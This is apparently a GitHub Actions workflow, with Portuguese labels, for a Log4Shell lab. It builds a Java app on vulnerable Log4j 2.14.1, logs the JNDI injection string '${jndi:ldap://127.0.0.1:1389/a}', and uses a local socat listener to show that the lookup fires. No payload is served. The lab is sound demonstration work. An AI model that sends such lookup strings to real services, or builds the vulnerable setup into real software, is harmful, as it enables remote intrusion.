name: "ðŸ§ª Log4Shell â€” cenÃ¡rio vulnerÃ¡vel (saÃ­da em tela)"

on:
  workflow_dispatch: {}

permissions:
  contents: read

jobs:
  vulneravel:
    name: "VulnerÃ¡vel â€” execuÃ§Ã£o e evidÃªncia em tela"
    runs-on: ubuntu-latest

    env:
      LOG4J_VERSION: "2.14.1"

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup ambiente (Java/Maven + utilitÃ¡rios)
        run: |
          sudo apt-get update -y
          sudo apt-get install -y maven jq socat unzip
          java -version
          mvn -v
          socat -V || true

      - name: Criar projeto Java (pom.xml + App.java)
        run: |
          mkdir -p src/main/java/com/example
          cat > pom.xml <<'XML'
          <project xmlns="http://maven.apache.org/POM/4.0.0"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
            <modelVersion>4.0.0</modelVersion>
            <groupId>com.example</groupId>
            <artifactId>log4j-lab</artifactId>
            <version>1.0.0</version>
            <properties>
              <maven.compiler.source>11</maven.compiler.source>
              <maven.compiler.target>11</maven.compiler.target>
              <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
            </properties>
            <dependencies>
              <dependency>
                <groupId>org.apache.logging.log4j</groupId>
                <artifactId>log4j-api</artifactId>
                <version>${log4j.version}</version>
              </dependency>
              <dependency>
                <groupId>org.apache.logging.log4j</groupId>
                <artifactId>log4j-core</artifactId>
                <version>${log4j.version}</version>
              </dependency>
            </dependencies>
            <build>
              <plugins>
                <plugin>
                  <groupId>org.codehaus.mojo</groupId>
                  <artifactId>exec-maven-plugin</artifactId>
                  <version>3.1.0</version>
                  <configuration>
                    <mainClass>com.example.App</mainClass>
                  </configuration>
                </plugin>
              </plugins>
            </build>
          </project>
          XML

          cat > src/main/java/com/example/App.java <<'JAVA'
          package com.example;
          import org.apache.logging.log4j.LogManager;
          import org.apache.logging.log4j.Logger;

          public class App {
              private static final Logger logger = LogManager.getLogger(App.class);

              public static void main(String[] args) {
                  // Entrada com marcador JNDI (demonstra lookup; sem payload algum)
                  String entrada = System.getenv().getOrDefault(
                      "LOG_INPUT",
                      "${jndi:ldap://127.0.0.1:1389/a}"
                  );

                  logger.info("Iniciando app Log4j (demo segura).");
                  // Mensagem DIRETA (nÃ£o usar "{}") para acionar o lookup em 2.14.1
                  logger.error(entrada);

                  System.out.println("APP_DONE");
              }
          }
          JAVA

      - name: Build (Log4j 2.14.1)
        run: |
          mvn -q -DskipTests -Dlog4j.version="${LOG4J_VERSION}" package
          echo "==> log4j-core efetivo: ${LOG4J_VERSION}"

      - name: Confirmar presenÃ§a do vetor (copiar JAR e inspecionar JndiLookup.class)
        run: |
          # Em vez de dependency:get (que tenta puxar 'log4j-core-java9'), copiamos sÃ³ o JAR alvo:
          mvn -q org.apache.maven.plugins:maven-dependency-plugin:3.6.1:copy \
              -Dartifact=org.apache.logging.log4j:log4j-core:${LOG4J_VERSION}:jar \
              -DoutputDirectory=./target/deps
          JAR="target/deps/log4j-core-${LOG4J_VERSION}.jar"
          echo "JAR: $JAR"
          (unzip -l "$JAR" | grep -q 'JndiLookup.class' && echo ">> JndiLookup PRESENTE (vetor existe)") || echo ">> JndiLookup AUSENTE"

      - name: Subir listener local (porta 1389) para evidenciar conexÃ£o
        run: |
          # Listener simples: imprime tudo que receber. NÃ£o envia payload algum.
          (socat -v -d -d TCP-LISTEN:1389,reuseaddr,fork - 2>&1 | tee ldap-listener.log) &
          echo $! > listener.pid
          sleep 1

      - name: Executar app com input JNDI (vulnerÃ¡vel)
        env:
          LOG_INPUT: '${jndi:ldap://127.0.0.1:1389/a}'   # aspas simples mantÃªm literal
        run: |
          echo "===== EXECUTANDO APP (vulneravel) ====="
          mvn -q \
            -Dexec.classpathScope=runtime \
            -Dlog4j.version="${LOG4J_VERSION}" \
            org.codehaus.mojo:exec-maven-plugin:3.1.0:java \
            -Dexec.jvmArgs='-Dlog4j2.formatMsgNoLookups=false' \
            | tee app-run-vulneravel.log
          echo "===== FIM DA EXECUÃ‡ÃƒO ====="
          sleep 3

      - name: Encerrar listener e imprimir capturas (prova em tela)
        if: always()
        run: |
          if [ -f listener.pid ]; then
            kill $(cat listener.pid) 2>/dev/null || true
          fi
          echo ""
          echo "===== CAPTURA DO LISTENER (porta 1389) â€” vulneravel ====="
          if [ -s ldap-listener.log ]; then
            # Mostra linhas mais Ãºteis; comente o grep para ver tudo
            grep -E "CONNECT|bytes|length|TCP" -n ldap-listener.log || head -n 80 ldap-listener.log || true
            echo ">> RESULTADO: ConexÃ£o JNDI FOI TENTADA (lookup disparado)."
          else
            echo "(vazio)"
            echo ">> RESULTADO: Nenhuma conexÃ£o registrada â€” verifique os passos anteriores."
          fi
          echo ""
          echo "===== TRECHO DO LOG DA APLICAÃ‡ÃƒO ====="
          (grep -E "\$\{jndi" -n app-run-vulneravel.log || head -n 20 app-run-vulneravel.log) 2>/dev/null || true

      - name: Artefatos (opcional)
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: "outputs-vulneravel"
          path: |
            app-run-vulneravel.log
            ldap-listener.log
